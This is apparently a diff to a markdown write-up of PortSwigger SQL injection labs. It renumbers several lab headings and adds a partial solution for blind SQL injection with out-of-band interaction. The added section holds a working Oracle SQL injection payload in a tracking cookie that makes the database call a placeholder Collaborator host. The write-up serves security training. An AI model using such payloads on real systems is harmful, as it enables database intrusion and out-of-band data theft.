@@ -337,7 +337,7 @@ We will login with those details.
 
 Thus, Lab is solved.
 
-## Lab: Blind SQL injection with conditional errors
+## Lab 12: Blind SQL injection with conditional errors
 
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
 
@@ -402,7 +402,7 @@ We will get all 20 password letters and we will login as administrator
 
 Thus, Lab is solved.
 
-## Lab: Visible error-based SQL injection
+## Lab 13: Visible error-based SQL injection
 
 This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
 
@@ -430,7 +430,7 @@ We will enter the password and logged in as administrator.
 
 Thus, the lab is solved.
 
-## Lab: Blind SQL injection with time delays
+## Lab 14: Blind SQL injection with time delays
 
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
 
@@ -452,7 +452,7 @@ Response will be delayed for 10 seconds and it got time delayed.
 
 Thus , the lab is solved.
 
-## Lab: Blind SQL injection with time delays and information retrieval
+## Lab 15: Blind SQL injection with time delays and information retrieval
 
 The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
 
@@ -500,3 +500,24 @@ Enter administrator username and its password
 ![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/0b179563-62a6-4323-9787-b962736e9371)
 
 Thus, lab is solved.
+
+## Lab 16: Blind SQL injection with out-of-band interaction
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
+
+### Sol :
+
+* Intercept the request through burpsuite and send it to repeater
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/36e4ccaf-7260-4510-bd14-f5b2b915b72b)
+
+* Modify the `TrackingId` cookie to the a payload that will trigger an interaction with the Collaborator server. 
+
+            TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[ <!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+* Right-click and select `Insert Collaborator payload` to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.
+
